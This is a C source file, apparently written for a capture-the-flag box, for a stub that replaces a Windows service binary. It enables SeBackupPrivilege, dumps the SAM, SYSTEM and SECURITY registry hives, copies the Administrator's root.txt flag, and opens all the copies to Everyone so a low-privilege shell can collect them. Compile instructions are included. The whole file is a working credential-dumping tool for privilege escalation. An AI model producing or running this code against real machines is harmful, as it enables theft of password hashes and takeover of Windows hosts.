/*
 * hivedump.c  —  Hive dump stub for the service-replacement shortcut
 *
 * Runs in place of Failure2Ban.exe: enables SeBackupPrivilege, saves
 * SAM/SYSTEM/SECURITY and copies root.txt into C:\Temp, then grants
 * Everyone read access so the unprivileged shell can grab them.
 *
 * Compile (mingw):
 *   x86_64-w64-mingw32-gcc -O2 -s -o hivedump.exe hivedump.c -ladvapi32
 */

#define _WIN32_WINNT 0x0600

#include <windows.h>
#include <aclapi.h>
#include <accctrl.h>

static BOOL enable_priv(LPCWSTR n)
{
    HANDLE h = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h))
        return FALSE;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    if (!LookupPrivilegeValueW(NULL, n, &tp.Privileges[0].Luid))
    {
        CloseHandle(h);
        return FALSE;
    }
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    SetLastError(ERROR_SUCCESS);
    /* Enable the right that sits disabled on the service token */
    BOOL ok = AdjustTokenPrivileges(h, FALSE, &tp, 0, NULL, NULL);
    DWORD e = GetLastError();
    CloseHandle(h);
    return ok && e == ERROR_SUCCESS;
}

static void grant_everyone(LPCWSTR path)
{
    SID_IDENTIFIER_AUTHORITY world = SECURITY_WORLD_SID_AUTHORITY;
    PSID sid = NULL;
    if (!AllocateAndInitializeSid(&world, 1, SECURITY_WORLD_RID,
                                  0, 0, 0, 0, 0, 0, 0, &sid))
        return;

    EXPLICIT_ACCESS_W ea;
    ZeroMemory(&ea, sizeof(ea));
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = GRANT_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPWSTR)sid;

    PACL acl = NULL;
    if (SetEntriesInAclW(1, &ea, NULL, &acl) == ERROR_SUCCESS)
    {
        /* Rewrite the DACL — the handoff to the low-priv shell */
        SetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT,
                              DACL_SECURITY_INFORMATION,
                              NULL, NULL, acl, NULL);
        LocalFree(acl);
    }
    FreeSid(sid);
}

static void save_hive(LPCWSTR sub, LPCWSTR out)
{
    HKEY h = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, sub, 0,
                      KEY_READ | READ_CONTROL, &h) != ERROR_SUCCESS)
        return;
    DeleteFileW(out);
    /* Dump the hive, then open it up for the low-priv shell */
    if (RegSaveKeyW(h, out, NULL) == ERROR_SUCCESS)
        grant_everyone(out);
    RegCloseKey(h);
}

static void steal_file(LPCWSTR src, LPCWSTR dst)
{
    if (!CopyFileW(src, dst, FALSE))
        return;
    grant_everyone(dst);
}

int main(void)
{
    CreateDirectoryW(L"C:\\Temp", NULL);

    /* Reg save bypasses ACLs — needs this privilege enabled */
    enable_priv(L"SeBackupPrivilege");

    save_hive(L"SAM", L"C:\\Temp\\sam.bak");
    save_hive(L"SYSTEM", L"C:\\Temp\\system.bak");
    save_hive(L"SECURITY", L"C:\\Temp\\security.bak");

    /* Copy the flag — easier than fighting its DACL */
    steal_file(L"C:\\Users\\Administrator\\Desktop\\root.txt", L"C:\\Temp\\root.txt");

    Sleep(30000); /* keep the service image alive until the files are readable */
    return 0;
}
